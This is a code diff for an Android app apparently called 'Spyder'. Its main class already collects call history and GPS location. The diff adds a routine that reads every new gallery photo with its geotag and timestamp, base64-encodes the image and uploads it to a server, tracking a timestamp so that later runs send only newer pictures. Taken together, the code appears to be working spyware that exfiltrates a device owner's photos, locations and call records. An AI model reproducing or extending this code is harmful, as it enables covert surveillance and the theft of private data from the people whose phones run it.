@@ -5,26 +5,35 @@ import android.app.Activity;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.net.Uri;
 import android.provider.CallLog;
 import android.provider.MediaStore;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
+import android.util.Base64;
 import android.util.Log;
 import android.widget.GridView;
 import android.widget.Toast;
 
+import com.bumptech.glide.util.Util;
 import com.google.gson.Gson;
 import com.spyder.app.activitys.MainActivity;
+import com.spyder.app.activitys.presenter.SpyderContract;
 import com.spyder.app.activitys.presenter.SpyderPresenter;
 import com.spyder.app.activitys.request.CallHistoryDetailsPojo;
 import com.spyder.app.activitys.request.PhotoDetail;
 import com.spyder.app.activitys.request.UserPhotoDetailList;
+import com.spyder.app.activitys.response.BaseContext;
 import com.spyder.app.activitys.view.activities.Browser;
 import com.spyder.app.activitys.webservices.GPSTrack;
 
+import java.io.ByteArrayOutputStream;
+import java.io.File;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Calendar;
 import java.util.Date;
 import java.util.List;
 
@@ -34,7 +43,7 @@ import static com.spyder.app.activitys.MainActivity.REQUEST_PERMISSIONS;
  * Created by srisailampaka on 11/02/18.
  */
 
-public class GetDetailsInformation {
+public class GetDetailsInformation implements SpyderContract.View {
     public static Context context;
     public static Gson gson = new Gson();
     public static SharedPref sharedPref;
@@ -45,6 +54,7 @@ public class GetDetailsInformation {
     public static List<PhotoDetail> photoDetailList;
     public static SpyderPresenter mSpyderPresenter;
     public static ArrayList<PhotoDetail> saveGalleryPhotoArrayList = new ArrayList<>();
+    public static ArrayList<PhotoDetail> finalGalleryPhotoArrayList = new ArrayList<>();
     public static boolean boolean_folder;
     private static final int REQUEST_PERMISSIONS = 100;
     public GetDetailsInformation(Context applicationContext) {
@@ -55,6 +65,7 @@ public class GetDetailsInformation {
         getlangitude = gpsTrack.currentLangitude;
         getLattitude = gpsTrack.currentLattitude;
         timeStamp = simpleDateFormat.format(new Date());
+        mSpyderPresenter = new SpyderPresenter(this, context);
     }
 
     public List<CallHistoryDetailsPojo> getCallHistory() {
@@ -177,89 +188,76 @@ public class GetDetailsInformation {
             faves.moveToNext();
         }
     }
-    public void getAllPhotos(){
-        if ((ActivityCompat.checkSelfPermission(context.getApplicationContext(),
-                Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) && (ContextCompat.checkSelfPermission(context.getApplicationContext(),
-                Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)) {
-            if ((ActivityCompat.shouldShowRequestPermissionRationale((Activity) context,
-                    Manifest.permission.WRITE_EXTERNAL_STORAGE)) && (ActivityCompat.shouldShowRequestPermissionRationale((Activity) context,
-                    Manifest.permission.READ_EXTERNAL_STORAGE))) {
 
-            } else {
-                ActivityCompat.requestPermissions((Activity) context,
-                        new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE},
-                        REQUEST_PERMISSIONS);
-            }
-        }else {
-            Log.e("Else","Else");
-            fn_imagespath();
-        }
-    }
-    public static List<PhotoDetail> fn_imagespath() {
+
+
+
+   public  static void getTheAllPhotos(){
+
         saveGalleryPhotoArrayList.clear();
-        int int_position = 0;
-        Uri uri;
-        Cursor cursor;
-        int column_index_data, column_index_folder_name;
+       String[] columns = { MediaStore.Images.ImageColumns.LATITUDE,
+               MediaStore.Images.ImageColumns.LONGITUDE,
+               MediaStore.Images.ImageColumns.TITLE,
+               MediaStore.Images.ImageColumns.DATA,
+               MediaStore.Images.ImageColumns.DATE_TAKEN
+       };
+       String selection= MediaStore.Images.ImageColumns.DATE_TAKEN+">"+sharedPref.getLastImageTimestamp();
 
-        String absolutePathOfImage = null;
-        uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+       final String orderBy = MediaStore.Images.ImageColumns.DATE_MODIFIED + " ASC";
+       Cursor cursor =  context.getApplicationContext().getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, columns, selection, null, orderBy);
 
-        String[] projection = {MediaStore.MediaColumns.DATA, MediaStore.Images.Media.BUCKET_DISPLAY_NAME};
+       int count = cursor.getCount();
+       String latitude, longitude,time;
+       String filePath;
+       for (int i = 0; i < count; i++) {
+           cursor.moveToPosition(i);
+           latitude = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.LATITUDE));
+           longitude = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.LONGITUDE));
+           time=cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.DATE_TAKEN));
+           filePath = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.DATA));
 
-        final String orderBy = MediaStore.Images.Media.DATE_TAKEN;
-        //String selection=+">"+sharedPref.getOneDayTimestamp()
-        cursor = context.getApplicationContext().getContentResolver().query(uri, projection, null, null, orderBy + " DESC");
+           PhotoDetail photoDetail=new PhotoDetail();
+           photoDetail.setUserId(sharedPref.getUserId());
+           photoDetail.setImage(getBase64Image(filePath));
+           photoDetail.setLattitude(latitude + "");
+           photoDetail.setLongitude(longitude+"");
 
-        column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
-        column_index_folder_name = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
-        while (cursor.moveToNext()) {
-            absolutePathOfImage = cursor.getString(column_index_data);
-            Log.e("Column", absolutePathOfImage);
-                Log.e("Folder", cursor.getString(column_index_folder_name));
+           photoDetail.setTimestamp(time);
+           saveGalleryPhotoArrayList.add(photoDetail);
 
-            for (int i = 0; i < saveGalleryPhotoArrayList.size(); i++) {
-                if (saveGalleryPhotoArrayList.get(i).getStr_folder().equals(cursor.getString(column_index_folder_name))) {
-                    boolean_folder = true;
-                    int_position = i;
-                    break;
-                } else {
-                    boolean_folder = false;
-                }
-            }
-            if (boolean_folder) {
-
-                ArrayList<String> al_path = new ArrayList<>();
-                al_path.addAll(saveGalleryPhotoArrayList.get(int_position).getAl_imagepath());
-                al_path.add(absolutePathOfImage);
-                saveGalleryPhotoArrayList.get(int_position).setAl_imagepath(al_path);
+           UserPhotoDetailList userPhotoDetailList = new UserPhotoDetailList();
+           userPhotoDetailList.setPhotoDetails(saveGalleryPhotoArrayList);
+           if(CommonUtil.isNetworkAvailable(context))
+           { mSpyderPresenter.savePhotoDetails(userPhotoDetailList);
+           sharedPref.setLastImageTimestamp(photoDetail.getTimestamp());
+           }else
+           {
+               break;
+           }
+           Log.v("srisailam",".."+i);
+           saveGalleryPhotoArrayList.clear();
+       }
 
 
-            } else {
-                ArrayList<String> al_path = new ArrayList<>();
-                al_path.add(absolutePathOfImage);
-                PhotoDetail obj_model = new PhotoDetail();
-                obj_model.setUserId(sharedPref.getUserId());
-                obj_model.setLattitude(getLattitude);
-                obj_model.setLongitude(getlangitude);
-                obj_model.setTimestamp(timeStamp);
-                obj_model.setStr_folder(cursor.getString(column_index_folder_name));
-                obj_model.setAl_imagepath(al_path);
-                saveGalleryPhotoArrayList.add(obj_model);
-            }
-
-        }
-        for (int i = 0; i < saveGalleryPhotoArrayList.size(); i++) {
-            Log.e("FOLDER", saveGalleryPhotoArrayList.get(i).getStr_folder());
-            for (int j = 0; j < saveGalleryPhotoArrayList.get(i).getAl_imagepath().size(); j++) {
-                Log.e("FILE", saveGalleryPhotoArrayList.get(i).getAl_imagepath().get(j));
-            }
-        }
-        UserPhotoDetailList userPhotoDetailList=new UserPhotoDetailList();
-        photoDetailList = new ArrayList<>();
-        userPhotoDetailList.setPhotoDetails(saveGalleryPhotoArrayList);
-        MyLog.log("Todaygetphotodetails", gson.toJson(userPhotoDetailList));
-        return saveGalleryPhotoArrayList;
     }
 
+    private static String getBase64Image(String filePath) {
+
+        File imageFile = new File(filePath);
+        Bitmap bitmap = BitmapFactory.decodeFile(imageFile.getAbsolutePath());
+        ByteArrayOutputStream stream = new ByteArrayOutputStream();
+        bitmap.compress(Bitmap.CompressFormat.PNG, 90, stream);
+        byte[] image = stream.toByteArray();
+        String img_str = Base64.encodeToString(image, 0);
+        return img_str;
+    }
+    @Override
+    public void successResponse(BaseContext baseContext) {
+
+    }
+
+    @Override
+    public void failureResponse(String error) {
+
+    }
 }
